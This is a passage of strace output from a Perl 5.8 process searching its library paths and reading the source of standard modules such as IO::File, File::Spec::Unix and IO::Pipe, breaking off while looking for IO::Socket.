10104 20:03:03.419171 stat64("/usr/lib/perl5/IO/File.pm", 0xbfa446ac) = -1 ENOENT (No such file or directory)
10104 20:03:03.419185 stat64("/usr/share/perl5/IO/File.pmc", 0xbfa4479c) = -1 ENOENT (No such file or directory)
10104 20:03:03.419197 stat64("/usr/share/perl5/IO/File.pm", 0xbfa446ac) = -1 ENOENT (No such file or directory)
10104 20:03:03.419211 stat64("/usr/lib/perl/5.8/IO/File.pmc", 0xbfa4479c) = -1 ENOENT (No such file or directory)
10104 20:03:03.419224 stat64("/usr/lib/perl/5.8/IO/File.pm", {st_mode=S_IFREG|0644, st_size=1784, ...}) = 0
10104 20:03:03.419246 open("/usr/lib/perl/5.8/IO/File.pm", O_RDONLY|O_LARGEFILE) = 6
10104 20:03:03.419261 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfa444b8) = -1 ENOTTY (Inappropriate ioctl for device)
10104 20:03:03.419272 _llseek(6, 0, [0], SEEK_CUR) = 0
10104 20:03:03.419291 read(6, "#\n\npackage IO::File;\n\nuse 5.006_001;\nuse strict;\nour($VERSION, @EXPORT, @EXPORT_OK, @ISA);\nuse Carp;\nuse Symbol;\nuse SelectSaver;\nuse IO::Seekable;\nuse File::Spec;\n\nrequire Exporter;\n\n@ISA = qw(IO::Handle IO::Seekable Exporter);\n\n$VERSION = \"1.13\";\n\n@EXPORT = @IO::Seekable::EXPORT;\n\neval {\n    # Make all Fcntl O_XXX constants available for importing\n    require Fcntl;\n    my @O = grep /^O_/, @Fcntl::EXPORT;\n    Fcntl->import(@O);  # first we import what we want to export\n    push(@EXPORT, @O);\n};\n\n################################################\n## Constructor\n##\n\nsub new {\n    my $type = shift;\n    my $class = ref($type) || $type || \"IO::File\";\n    @_ >= 0 && @_ <= 3\n\tor croak \"usage: new $class [FILENAME [,MODE [,PERMS]]]\";\n    my $fh = $class->SUPER::new();\n    if (@_) {\n\t$fh->open(@_)\n\t    or return undef;\n    }\n    $fh;\n}\n\n################################################\n## Open\n##\n\nsub open {\n    @_ >= 2 && @_ <= 4 or croak \'usage: $fh->open(FILENAME [,MODE [,PERMS]])\';\n    my ($fh, $file) = @_;\n    if (@_ > 2) {\n\tmy ($mode, $perms) = @_[2, 3];\n\tif ($mode =~ /^\\d+$/) {\n\t    defined $perms or $perms = 0666;\n\t    return sysopen($fh, $file, $mode, $perms);\n\t} elsif ($mode =~ /:/) {\n\t    return open($fh, $mode, $file) if @_ == 3;\n\t    croak \'usage: $fh->open(FILENAME, IOLAYERS)\';\n\t}\n\tif (defined($file) && length($file)\n\t    && ! File::Spec->file_name_is_absolute($file))\n\t{\n\t    $file = File::Spec->rel2abs($file);\n\t}\n\t$file = IO::Handle::_open_mode_string($mode) . \" $file\\0\";\n    }\n    open($fh, $file);\n}\n\n################################################\n## Binmode\n##\n\nsub binmode {\n    ( @_ == 1 or @_ == 2 ) or croak \'usage $fh->binmode([LAYER])\';\n\n    my($fh, $layer) = @_;\n\n    return binmode $$fh unless $layer;\n    return binmode $$fh, $layer;\n}\n\n1;\n", 4096) = 1784
10104 20:03:03.419551 stat64("/etc/perl/File/Spec.pmc", 0xbfa442ec) = -1 ENOENT (No such file or directory)
10104 20:03:03.419574 stat64("/etc/perl/File/Spec.pm", 0xbfa441fc) = -1 ENOENT (No such file or directory)
10104 20:03:03.419589 stat64("/usr/local/lib/perl/5.8.8/File/Spec.pmc", 0xbfa442ec) = -1 ENOENT (No such file or directory)
10104 20:03:03.419602 stat64("/usr/local/lib/perl/5.8.8/File/Spec.pm", 0xbfa441fc) = -1 ENOENT (No such file or directory)
10104 20:03:03.419617 stat64("/usr/local/share/perl/5.8.8/File/Spec.pmc", 0xbfa442ec) = -1 ENOENT (No such file or directory)
10104 20:03:03.419630 stat64("/usr/local/share/perl/5.8.8/File/Spec.pm", 0xbfa441fc) = -1 ENOENT (No such file or directory)
10104 20:03:03.419644 stat64("/usr/lib/perl5/File/Spec.pmc", 0xbfa442ec) = -1 ENOENT (No such file or directory)
10104 20:03:03.419656 stat64("/usr/lib/perl5/File/Spec.pm", 0xbfa441fc) = -1 ENOENT (No such file or directory)
10104 20:03:03.419670 stat64("/usr/share/perl5/File/Spec.pmc", 0xbfa442ec) = -1 ENOENT (No such file or directory)
10104 20:03:03.419682 stat64("/usr/share/perl5/File/Spec.pm", 0xbfa441fc) = -1 ENOENT (No such file or directory)
10104 20:03:03.419696 stat64("/usr/lib/perl/5.8/File/Spec.pmc", 0xbfa442ec) = -1 ENOENT (No such file or directory)
10104 20:03:03.419709 stat64("/usr/lib/perl/5.8/File/Spec.pm", 0xbfa441fc) = -1 ENOENT (No such file or directory)
10104 20:03:03.419723 stat64("/usr/share/perl/5.8/File/Spec.pmc", 0xbfa442ec) = -1 ENOENT (No such file or directory)
10104 20:03:03.419737 stat64("/usr/share/perl/5.8/File/Spec.pm", {st_mode=S_IFREG|0644, st_size=595, ...}) = 0
10104 20:03:03.419759 open("/usr/share/perl/5.8/File/Spec.pm", O_RDONLY|O_LARGEFILE) = 8
10104 20:03:03.419774 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfa44008) = -1 ENOTTY (Inappropriate ioctl for device)
10104 20:03:03.419786 _llseek(8, 0, [0], SEEK_CUR) = 0
10104 20:03:03.419804 read(8, "package File::Spec;\n\nuse strict;\nuse vars qw(@ISA $VERSION);\n\n$VERSION = \'3.12\';\n$VERSION = eval $VERSION;\n\nmy %module = (MacOS   => \'Mac\',\n\t      MSWin32 => \'Win32\',\n\t      os2     => \'OS2\',\n\t      VMS     => \'VMS\',\n\t      epoc    => \'Epoc\',\n\t      NetWare => \'Win32\', # Yes, File::Spec::Win32 works on NetWare.\n\t      symbian => \'Win32\', # Yes, File::Spec::Win32 works on symbian.\n\t      dos     => \'OS2\',   # Yes, File::Spec::OS2 works on DJGPP.\n\t      cygwin  => \'Cygwin\');\n\nmy $module = $module{$^O} || \'Unix\';\n\nrequire \"File/Spec/$module.pm\";\n@ISA = (\"File::Spec::$module\");\n\n1;\n\n__END__\n\n", 4096) = 595
10104 20:03:03.419880 stat64("/etc/perl/vars.pmc", 0xbfa43e3c) = -1 ENOENT (No such file or directory)
10104 20:03:03.419906 stat64("/etc/perl/vars.pm", 0xbfa43d4c) = -1 ENOENT (No such file or directory)
10104 20:03:03.419944 stat64("/usr/local/lib/perl/5.8.8/vars.pmc", 0xbfa43e3c) = -1 ENOENT (No such file or directory)
10104 20:03:03.419958 stat64("/usr/local/lib/perl/5.8.8/vars.pm", 0xbfa43d4c) = -1 ENOENT (No such file or directory)
10104 20:03:03.419986 stat64("/usr/local/share/perl/5.8.8/vars.pmc", 0xbfa43e3c) = -1 ENOENT (No such file or directory)
10104 20:03:03.419998 stat64("/usr/local/share/perl/5.8.8/vars.pm", 0xbfa43d4c) = -1 ENOENT (No such file or directory)
10104 20:03:03.420013 stat64("/usr/lib/perl5/vars.pmc", 0xbfa43e3c) = -1 ENOENT (No such file or directory)
10104 20:03:03.420025 stat64("/usr/lib/perl5/vars.pm", 0xbfa43d4c) = -1 ENOENT (No such file or directory)
10104 20:03:03.420039 stat64("/usr/share/perl5/vars.pmc", 0xbfa43e3c) = -1 ENOENT (No such file or directory)
10104 20:03:03.420050 stat64("/usr/share/perl5/vars.pm", 0xbfa43d4c) = -1 ENOENT (No such file or directory)
10104 20:03:03.420064 stat64("/usr/lib/perl/5.8/vars.pmc", 0xbfa43e3c) = -1 ENOENT (No such file or directory)
10104 20:03:03.420076 stat64("/usr/lib/perl/5.8/vars.pm", 0xbfa43d4c) = -1 ENOENT (No such file or directory)
10104 20:03:03.420090 stat64("/usr/share/perl/5.8/vars.pmc", 0xbfa43e3c) = -1 ENOENT (No such file or directory)
10104 20:03:03.420102 stat64("/usr/share/perl/5.8/vars.pm", {st_mode=S_IFREG|0644, st_size=1149, ...}) = 0
10104 20:03:03.420127 open("/usr/share/perl/5.8/vars.pm", O_RDONLY|O_LARGEFILE) = 10
10104 20:03:03.420142 ioctl(10, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfa43b58) = -1 ENOTTY (Inappropriate ioctl for device)
10104 20:03:03.420153 _llseek(10, 0, [0], SEEK_CUR) = 0
10104 20:03:03.420170 read(10, "package vars;\n\nuse 5.006;\n\nour $VERSION = \'1.01\';\n\nuse warnings::register;\nuse strict qw(vars subs);\n\nsub import {\n    my $callpack = caller;\n    my ($pack, @imports) = @_;\n    my ($sym, $ch);\n    foreach (@imports) {\n        if (($ch, $sym) = /^([\\$\\@\\%\\*\\&])(.+)/) {\n\t    if ($sym =~ /\\W/) {\n\t\t# time for a more-detailed check-up\n\t\tif ($sym =~ /^\\w+[[{].*[]}]$/) {\n\t\t    require Carp;\n\t\t    Carp::croak(\"Can\'t declare individual elements of hash or array\");\n\t\t} elsif (warnings::enabled() and length($sym) == 1 and $sym !~ tr/a-zA-Z//) {\n\t\t    warnings::warn(\"No need to declare built-in vars\");\n\t\t} elsif  (($^H &= strict::bits(\'vars\'))) {\n\t\t    require Carp;\n\t\t    Carp::croak(\"\'$_\' is not a valid variable name under strict vars\");\n\t\t}\n\t    }\n\t    $sym = \"${callpack}::$sym\" unless $sym =~ /::/;\n\t    *$sym =\n\t\t(  $ch eq \"\\$\" ? \\$$sym\n\t\t : $ch eq \"\\@\" ? \\@$sym\n\t\t : $ch eq \"\\%\" ? \\%$sym\n\t\t : $ch eq \"\\*\" ? \\*$sym\n\t\t : $ch eq \"\\&\" ? \\&$sym \n\t\t : do {\n\t\t     require Carp;\n\t\t     Carp::croak(\"\'$_\' is not a valid variable name\");\n\t\t });\n\t} else {\n\t    require Carp;\n\t    Carp::croak(\"\'$_\' is not a valid variable name\");\n\t}\n    }\n};\n\n1;\n__END__\n\n", 4096) = 1149
10104 20:03:03.420284 stat64("/etc/perl/warnings/register.pmc", 0xbfa4398c) = -1 ENOENT (No such file or directory)
10104 20:03:03.420299 stat64("/etc/perl/warnings/register.pm", 0xbfa4389c) = -1 ENOENT (No such file or directory)
10104 20:03:03.420313 stat64("/usr/local/lib/perl/5.8.8/warnings/register.pmc", 0xbfa4398c) = -1 ENOENT (No such file or directory)
10104 20:03:03.420326 stat64("/usr/local/lib/perl/5.8.8/warnings/register.pm", 0xbfa4389c) = -1 ENOENT (No such file or directory)
10104 20:03:03.420341 stat64("/usr/local/share/perl/5.8.8/warnings/register.pmc", 0xbfa4398c) = -1 ENOENT (No such file or directory)
10104 20:03:03.420354 stat64("/usr/local/share/perl/5.8.8/warnings/register.pm", 0xbfa4389c) = -1 ENOENT (No such file or directory)
10104 20:03:03.420369 stat64("/usr/lib/perl5/warnings/register.pmc", 0xbfa4398c) = -1 ENOENT (No such file or directory)
10104 20:03:03.420382 stat64("/usr/lib/perl5/warnings/register.pm", 0xbfa4389c) = -1 ENOENT (No such file or directory)
10104 20:03:03.420406 stat64("/usr/share/perl5/warnings/register.pmc", 0xbfa4398c) = -1 ENOENT (No such file or directory)
10104 20:03:03.420447 stat64("/usr/share/perl5/warnings/register.pm", 0xbfa4389c) = -1 ENOENT (No such file or directory)
10104 20:03:03.420490 stat64("/usr/lib/perl/5.8/warnings/register.pmc", 0xbfa4398c) = -1 ENOENT (No such file or directory)
10104 20:03:03.420503 stat64("/usr/lib/perl/5.8/warnings/register.pm", 0xbfa4389c) = -1 ENOENT (No such file or directory)
10104 20:03:03.420517 stat64("/usr/share/perl/5.8/warnings/register.pmc", 0xbfa4398c) = -1 ENOENT (No such file or directory)
10104 20:03:03.420531 stat64("/usr/share/perl/5.8/warnings/register.pm", {st_mode=S_IFREG|0644, st_size=732, ...}) = 0
10104 20:03:03.420553 open("/usr/share/perl/5.8/warnings/register.pm", O_RDONLY|O_LARGEFILE) = 11
10104 20:03:03.420568 ioctl(11, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfa436a8) = -1 ENOTTY (Inappropriate ioctl for device)
10104 20:03:03.420579 _llseek(11, 0, [0], SEEK_CUR) = 0
10104 20:03:03.420598 read(11, "package warnings::register;\n\nour $VERSION = \'1.01\';\n\nrequire warnings;\n\nsub mkMask\n{\n    my ($bit) = @_;\n    my $mask = \"\";\n\n    vec($mask, $bit, 1) = 1;\n    return $mask;\n}\n\nsub import\n{\n    shift;\n    my $package = (caller(0))[0];\n    if (! defined $warnings::Bits{$package}) {\n        $warnings::Bits{$package}     = mkMask($warnings::LAST_BIT);\n        vec($warnings::Bits{\'all\'}, $warnings::LAST_BIT, 1) = 1;\n        $warnings::Offsets{$package}  = $warnings::LAST_BIT ++;\n\tforeach my $k (keys %warnings::Bits) {\n\t    vec($warnings::Bits{$k}, $warnings::LAST_BIT, 1) = 0;\n\t}\n        $warnings::DeadBits{$package} = mkMask($warnings::LAST_BIT);\n        vec($warnings::DeadBits{\'all\'}, $warnings::LAST_BIT++, 1) = 1;\n    }\n}\n\n1;\n", 4096) = 732
10104 20:03:03.420749 read(11, "", 4096) = 0
10104 20:03:03.420763 close(11)         = 0
10104 20:03:03.421022 _llseek(10, 1148, [1148], SEEK_SET) = 0
10104 20:03:03.421039 _llseek(10, 0, [1148], SEEK_CUR) = 0
10104 20:03:03.421050 close(10)         = 0
10104 20:03:03.421120 _llseek(8, 594, [594], SEEK_SET) = 0
10104 20:03:03.421135 _llseek(8, 0, [594], SEEK_CUR) = 0
10104 20:03:03.421145 close(8)          = 0
10104 20:03:03.421179 stat64("/etc/perl/File/Spec/Unix.pmc", 0xbfa442ec) = -1 ENOENT (No such file or directory)
10104 20:03:03.421195 stat64("/etc/perl/File/Spec/Unix.pm", 0xbfa441fc) = -1 ENOENT (No such file or directory)
10104 20:03:03.421210 stat64("/usr/local/lib/perl/5.8.8/File/Spec/Unix.pmc", 0xbfa442ec) = -1 ENOENT (No such file or directory)
10104 20:03:03.421223 stat64("/usr/local/lib/perl/5.8.8/File/Spec/Unix.pm", 0xbfa441fc) = -1 ENOENT (No such file or directory)
10104 20:03:03.421238 stat64("/usr/local/share/perl/5.8.8/File/Spec/Unix.pmc", 0xbfa442ec) = -1 ENOENT (No such file or directory)
10104 20:03:03.421251 stat64("/usr/local/share/perl/5.8.8/File/Spec/Unix.pm", 0xbfa441fc) = -1 ENOENT (No such file or directory)
10104 20:03:03.421266 stat64("/usr/lib/perl5/File/Spec/Unix.pmc", 0xbfa442ec) = -1 ENOENT (No such file or directory)
10104 20:03:03.421279 stat64("/usr/lib/perl5/File/Spec/Unix.pm", 0xbfa441fc) = -1 ENOENT (No such file or directory)
10104 20:03:03.421293 stat64("/usr/share/perl5/File/Spec/Unix.pmc", 0xbfa442ec) = -1 ENOENT (No such file or directory)
10104 20:03:03.421306 stat64("/usr/share/perl5/File/Spec/Unix.pm", 0xbfa441fc) = -1 ENOENT (No such file or directory)
10104 20:03:03.421320 stat64("/usr/lib/perl/5.8/File/Spec/Unix.pmc", 0xbfa442ec) = -1 ENOENT (No such file or directory)
10104 20:03:03.421333 stat64("/usr/lib/perl/5.8/File/Spec/Unix.pm", 0xbfa441fc) = -1 ENOENT (No such file or directory)
10104 20:03:03.421348 stat64("/usr/share/perl/5.8/File/Spec/Unix.pmc", 0xbfa442ec) = -1 ENOENT (No such file or directory)
10104 20:03:03.421362 stat64("/usr/share/perl/5.8/File/Spec/Unix.pm", {st_mode=S_IFREG|0644, st_size=7038, ...}) = 0
10104 20:03:03.421384 open("/usr/share/perl/5.8/File/Spec/Unix.pm", O_RDONLY|O_LARGEFILE) = 8
10104 20:03:03.421446 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfa44008) = -1 ENOTTY (Inappropriate ioctl for device)
10104 20:03:03.421480 _llseek(8, 0, [0], SEEK_CUR) = 0
10104 20:03:03.421504 read(8, "package File::Spec::Unix;\n\nuse strict;\nuse vars qw($VERSION);\n\n$VERSION = \'1.5\';\n\nsub canonpath {\n    my ($self,$path) = @_;\n    \n    # Handle POSIX-style node names beginning with double slash (qnx, nto)\n    # Handle network path names beginning with double slash (cygwin)\n    # (POSIX says: \"a pathname that begins with two successive slashes\n    # may be interpreted in an implementation-defined manner, although\n    # more than two leading slashes shall be treated as a single slash.\")\n    my $node = \'\';\n    if ( $^O =~ m/^(?:qnx|nto|cygwin)$/ && $path =~ s:^(//[^/]+)(/|\\z):/:s ) {\n      $node = $1;\n    }\n    # This used to be\n    # $path =~ s|/+|/|g unless($^O eq \'cygwin\');\n    # but that made tests 29, 30, 35, 46, and 213 (as of #13272) to fail\n    # (Mainly because trailing \"\" directories didn\'t get stripped).\n    # Why would cygwin avoid collapsing multiple slashes into one? --jhi\n    $path =~ s|/+|/|g;                             # xx////xx  -> xx/xx\n    $path =~ s@(/\\.)+(/|\\Z(?!\\n))@/@g;             # xx/././xx -> xx/xx\n    $path =~ s|^(\\./)+||s unless $path eq \"./\";    # ./xx      -> xx\n    $path =~ s|^/(\\.\\./)+|/|;                      # /../../xx -> xx\n    $path =~ s|^/\\.\\.$|/|;                         # /..       -> /\n    $path =~ s|/\\Z(?!\\n)|| unless $path eq \"/\";          # xx/       -> xx\n    return \"$node$path\";\n}\n\nsub catdir {\n    my $self = shift;\n\n    $self->canonpath(join(\'/\', @_, \'\')); # \'\' because need a trailing \'/\'\n}\n\nsub catfile {\n    my $self = shift;\n    my $file = $self->canonpath(pop @_);\n    return $file unless @_;\n    my $dir = $self->catdir(@_);\n    $dir .= \"/\" unless substr($dir,-1) eq \"/\";\n    return $dir.$file;\n}\n\nsub curdir () { \'.\' }\n\nsub devnull () { \'/dev/null\' }\n\nsub rootdir () { \'/\' }\n\nmy $tmpdir;\nsub _tmpdir {\n    return $tmpdir if defined $tmpdir;\n    my $self = shift;\n    my @dirlist = @_;\n    {\n\tno strict \'refs\';\n\tif (${\"\\cTAINT\"}) { # Check for taint mode on perl >= 5.8.0\n            require Scalar::Util;\n\t    @dirlist = grep { ! Scalar::Util::tainted($_) } @dirlist;\n\t}\n    }\n    foreach (@dirlist) {\n\tnext unless defined && -d && -w _;\n\t$tmpdir = $_;\n\tlast;\n    }\n    $tmpdir = $self->curdir unless defined $tmpdir;\n    $tmpdir = defined $tmpdir && $self->canonpath($tmpdir);\n    return $tmpdir;\n}\n\nsub tmpdir {\n    return $tmpdir if defined $tmpdir;\n    $tmpdir = $_[0]->_tmpdir( $ENV{TMPDIR}, \"/tmp\" );\n}\n\nsub updir () { \'..\' }\n\nsub no_upwards {\n    my $self = shift;\n    return grep(!/^\\.{1,2}\\Z(?!\\n)/s, @_);\n}\n\nsub case_tolerant () { 0 }\n\nsub file_name_is_absolute {\n    my ($self,$file) = @_;\n    return scalar($file =~ m:^/:s);\n}\n\nsub path {\n    return () unless exists $ENV{PATH};\n    my @path = split(\':\', $ENV{PATH});\n    foreach (@path) { $_ = \'.\' if $_ eq \'\' }\n    return @path;\n}\n\nsub join {\n    my $self = shift;\n    return $self->catfile(@_);\n}\n\nsub splitpath {\n    my ($self,$path, $nofile) = @_;\n\n    my ($volume,$directory,$file) = (\'\',\'\',\'\');\n\n    if ( $nofile ) {\n        $directory = $path;\n    }\n    else {\n        $path =~ m|^ ( (?: .* / (?: \\.\\.?\\Z(?!\\n) )? )? ) ([^/]*) |xs;\n        $directory = $1;\n        $file      = $2;\n    }\n\n    return ($volume,$directory,$file);\n}\n\nsub splitdir {\n    return split m|/|, $_[1], -1;  # Preserve trailing fields\n}\n\nsub catpath {\n    my ($self,$volume,$directory,$file) = @_;\n\n    if ( $directory ne \'\'                && \n         $file ne \'\'                     && \n         substr( $directory, -1 ) ne \'/\' && \n         substr( $file, 0, 1 ) ne \'/\' \n    ) {\n        $directory .= \"/$file\" ;\n    }\n    else {\n        $directory .= $file ;\n    }\n\n    return $directory ;\n}\n\nsub abs2rel {\n    my($self,$path,$base) = @_;\n\n    # Figure out the effective $base and clean it up.\n    if ( !defined( $base ) || $base eq \'\' ) {\n        $base = $self->_cwd();\n    }\n    elsif ( ! $self->file_name_is_absolute( $base ) ) {\n\tif ( ! $self->file_name_is_absolute( $path ) ) {\n\t    # optimisation where both paths are relative: save 2 x cwd\n\t    $base = $self->canonpath( \"/$base\" );\n\t    $path = \"/$path\";\n\t}\n\telse {\n\t    $base = $self->rel2abs( $base ) ;\n\t}\n    }\n  ", 4096) = 4096
10104 20:03:03.422349 brk(0x8218000)    = 0x8218000
10104 20:03:03.422539 read(8, "  else {\n        $base = $self->canonpath( $base ) ;\n    }\n\n    # Clean up $path\n    if ( ! $self->file_name_is_absolute( $path ) ) {\n        $path = $self->rel2abs( $path ) ;\n    }\n    else {\n        $path = $self->canonpath( $path ) ;\n    }\n\n    # Now, remove all leading components that are the same\n    my @pathchunks = $self->splitdir( $path);\n    my @basechunks = $self->splitdir( $base);\n\n    while (@pathchunks && @basechunks && $pathchunks[0] eq $basechunks[0]) {\n        shift @pathchunks ;\n        shift @basechunks ;\n    }\n\n    $path = CORE::join( \'/\', @pathchunks );\n    $base = CORE::join( \'/\', @basechunks );\n\n    # $base now contains the directories the resulting relative path \n    # must ascend out of before it can descend to $path_directory.  So, \n    # replace all names with $parentDir\n    $base =~ s|[^/]+|..|g ;\n\n    # Glue the two together, using a separator if necessary, and preventing an\n    # empty result.\n    if ( $path ne \'\' && $base ne \'\' ) {\n        $path = \"$base/$path\" ;\n    } else {\n        $path = \"$base$path\" ;\n    }\n\n    return $self->canonpath( $path ) ;\n}\n\nsub rel2abs {\n    my ($self,$path,$base ) = @_;\n\n    # Clean up $path\n    if ( ! $self->file_name_is_absolute( $path ) ) {\n        # Figure out the effective $base and clean it up.\n        if ( !defined( $base ) || $base eq \'\' ) {\n\t    $base = $self->_cwd();\n        }\n        elsif ( ! $self->file_name_is_absolute( $base ) ) {\n            $base = $self->rel2abs( $base ) ;\n        }\n        else {\n            $base = $self->canonpath( $base ) ;\n        }\n\n        # Glom them together\n        $path = $self->catdir( $base, $path ) ;\n    }\n\n    return $self->canonpath( $path ) ;\n}\n\n# Internal routine to File::Spec, no point in making this public since\n# it is the standard Cwd interface.  Most of the platform-specific\n# File::Spec subclasses use this.\nsub _cwd {\n    require Cwd;\n    Cwd::cwd();\n}\n\n# Internal method to reduce xx\\..\\yy -> yy\nsub _collapse {\n    my($fs, $path) = @_;\n\n    my $updir  = $fs->updir;\n    my $curdir = $fs->curdir;\n\n    my($vol, $dirs, $file) = $fs->splitpath($path);\n    my @dirs = $fs->splitdir($dirs);\n\n    my @collapsed;\n    foreach my $dir (@dirs) {\n        if( $dir eq $updir              and   # if we have an updir\n            @collapsed                  and   # and something to collapse\n            length $collapsed[-1]       and   # and its not the rootdir\n            $collapsed[-1] ne $updir    and   # nor another updir\n            $collapsed[-1] ne $curdir         # nor the curdir\n          ) \n        {                                     # then\n            pop @collapsed;                   # collapse\n        }\n        else {                                # else\n            push @collapsed, $dir;            # just hang onto it\n        }\n    }\n\n    return $fs->catpath($vol,\n                        $fs->catdir(@collapsed),\n                        $file\n                       );\n}\n\n1;\n", 4096) = 2942
10104 20:03:03.422986 read(8, "", 4096) = 0
10104 20:03:03.423003 close(8)          = 0
10104 20:03:03.423485 read(6, "", 4096) = 0
10104 20:03:03.423517 close(6)          = 0
10104 20:03:03.423817 stat64("/etc/perl/IO/Pipe.pmc", 0xbfa4479c) = -1 ENOENT (No such file or directory)
10104 20:03:03.423850 stat64("/etc/perl/IO/Pipe.pm", 0xbfa446ac) = -1 ENOENT (No such file or directory)
10104 20:03:03.423865 stat64("/usr/local/lib/perl/5.8.8/IO/Pipe.pmc", 0xbfa4479c) = -1 ENOENT (No such file or directory)
10104 20:03:03.423878 stat64("/usr/local/lib/perl/5.8.8/IO/Pipe.pm", 0xbfa446ac) = -1 ENOENT (No such file or directory)
10104 20:03:03.423893 stat64("/usr/local/share/perl/5.8.8/IO/Pipe.pmc", 0xbfa4479c) = -1 ENOENT (No such file or directory)
10104 20:03:03.423906 stat64("/usr/local/share/perl/5.8.8/IO/Pipe.pm", 0xbfa446ac) = -1 ENOENT (No such file or directory)
10104 20:03:03.423921 stat64("/usr/lib/perl5/IO/Pipe.pmc", 0xbfa4479c) = -1 ENOENT (No such file or directory)
10104 20:03:03.423970 stat64("/usr/lib/perl5/IO/Pipe.pm", 0xbfa446ac) = -1 ENOENT (No such file or directory)
10104 20:03:03.423985 stat64("/usr/share/perl5/IO/Pipe.pmc", 0xbfa4479c) = -1 ENOENT (No such file or directory)
10104 20:03:03.423998 stat64("/usr/share/perl5/IO/Pipe.pm", 0xbfa446ac) = -1 ENOENT (No such file or directory)
10104 20:03:03.424012 stat64("/usr/lib/perl/5.8/IO/Pipe.pmc", 0xbfa4479c) = -1 ENOENT (No such file or directory)
10104 20:03:03.424026 stat64("/usr/lib/perl/5.8/IO/Pipe.pm", {st_mode=S_IFREG|0644, st_size=3426, ...}) = 0
10104 20:03:03.424049 open("/usr/lib/perl/5.8/IO/Pipe.pm", O_RDONLY|O_LARGEFILE) = 6
10104 20:03:03.424064 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfa444b8) = -1 ENOTTY (Inappropriate ioctl for device)
10104 20:03:03.424077 _llseek(6, 0, [0], SEEK_CUR) = 0
10104 20:03:03.424129 read(6, "# IO::Pipe.pm\n#\n# Copyright (c) 1996-8 Graham Barr <gbarr@pobox.com>. All rights reserved.\n# This program is free software; you can redistribute it and/or\n# modify it under the same terms as Perl itself.\n\npackage IO::Pipe;\n\nuse 5.006_001;\n\nuse IO::Handle;\nuse strict;\nour($VERSION);\nuse Carp;\nuse Symbol;\n\n$VERSION = \"1.13\";\n\nsub new {\n    my $type = shift;\n    my $class = ref($type) || $type || \"IO::Pipe\";\n    @_ == 0 || @_ == 2 or croak \"usage: new $class [READFH, WRITEFH]\";\n\n    my $me = bless gensym(), $class;\n\n    my($readfh,$writefh) = @_ ? @_ : $me->handles;\n\n    pipe($readfh, $writefh)\n\tor return undef;\n\n    @{*$me} = ($readfh, $writefh);\n\n    $me;\n}\n\nsub handles {\n    @_ == 1 or croak \'usage: $pipe->handles()\';\n    (IO::Pipe::End->new(), IO::Pipe::End->new());\n}\n\nmy $do_spawn = $^O eq \'os2\' || $^O eq \'MSWin32\';\n\nsub _doit {\n    my $me = shift;\n    my $rw = shift;\n\n    my $pid = $do_spawn ? 0 : fork();\n\n    if($pid) { # Parent\n        return $pid;\n    }\n    elsif(defined $pid) { # Child or spawn\n        my $fh;\n        my $io = $rw ? \\*STDIN : \\*STDOUT;\n        my ($mode, $save) = $rw ? \"r\" : \"w\";\n        if ($do_spawn) {\n          require Fcntl;\n          $save = IO::Handle->new_from_fd($io, $mode);\n\t  my $handle = shift;\n          # Close in child:\n\t  unless ($^O eq \'MSWin32\') {\n            fcntl($handle, Fcntl::F_SETFD(), 1) or croak \"fcntl: $!\";\n\t  }\n          $fh = $rw ? ${*$me}[0] : ${*$me}[1];\n        } else {\n          shift;\n          $fh = $rw ? $me->reader() : $me->writer(); # close the other end\n        }\n        bless $io, \"IO::Handle\";\n        $io->fdopen($fh, $mode);\n\t$fh->close;\n\n        if ($do_spawn) {\n          $pid = eval { system 1, @_ }; # 1 == P_NOWAIT\n          my $err = $!;\n    \n          $io->fdopen($save, $mode);\n          $save->close or croak \"Cannot close $!\";\n          croak \"IO::Pipe: Cannot spawn-NOWAIT: $err\" if not $pid or $pid < 0;\n          return $pid;\n        } else {\n          exec @_ or\n            croak \"IO::Pipe: Cannot exec: $!\";\n        }\n    }\n    else {\n        croak \"IO::Pipe: Cannot fork: $!\";\n    }\n\n    # NOT Reached\n}\n\nsub reader {\n    @_ >= 1 or croak \'usage: $pipe->reader( [SUB_COMMAND_ARGS] )\';\n    my $me = shift;\n\n    return undef\n\tunless(ref($me) || ref($me = $me->new));\n\n    my $fh  = ${*$me}[0];\n    my $pid;\n    $pid = $me->_doit(0, $fh, @_)\n        if(@_);\n\n    close ${*$me}[1];\n    bless $me, ref($fh);\n    *$me = *$fh;          # Alias self to handle\n    $me->fdopen($fh->fileno,\"r\")\n\tunless defined($me->fileno);\n    bless $fh;                  # Really wan\'t un-bless here\n    ${*$me}{\'io_pipe_pid\'} = $pid\n        if defined $pid;\n\n    $me;\n}\n\nsub writer {\n    @_ >= 1 or croak \'usage: $pipe->writer( [SUB_COMMAND_ARGS] )\';\n    my $me = shift;\n\n    return undef\n\tunless(ref($me) || ref($me = $me->new));\n\n    my $fh  = ${*$me}[1];\n    my $pid;\n    $pid = $me->_doit(1, $fh, @_)\n        if(@_);\n\n    close ${*$me}[0];\n    bless $me, ref($fh);\n    *$me = *$fh;          # Alias self to handle\n    $me->fdopen($fh->fileno,\"w\")\n\tunless defined($me->fileno);\n    bless $fh;                  # Really wan\'t un-bless here\n    ${*$me}{\'io_pipe_pid\'} = $pid\n        if defined $pid;\n\n    $me;\n}\n\npackage IO::Pipe::End;\n\nour(@ISA);\n\n@ISA = qw(IO::Handle);\n\nsub close {\n    my $fh = shift;\n    my $r = $fh->SUPER::close(@_);\n\n    waitpid(${*$fh}{\'io_pipe_pid\'},0)\n\tif(defined ${*$fh}{\'io_pipe_pid\'});\n\n    $r;\n}\n\n1;\n\n__END__\n\n", 4096) = 3426
10104 20:03:03.424883 _llseek(6, 3425, [3425], SEEK_SET) = 0
10104 20:03:03.424903 _llseek(6, 0, [3425], SEEK_CUR) = 0
10104 20:03:03.424914 close(6)          = 0
10104 20:03:03.424979 stat64("/etc/perl/IO/Socket.pmc", 0xbfa4479c) = -1 ENOENT (No such file or directory)
10104 20:03:03.424996 stat64("/etc/perl/IO/Socket.pm", 0xbfa446ac) = -1 ENOENT (No such file or directory)
10104 20:03:03.425011 stat64("/usr/local/lib/perl/5.8.8/IO/Socket.pmc", 0xbfa4479c) = -1 ENOENT (No such file or directory)
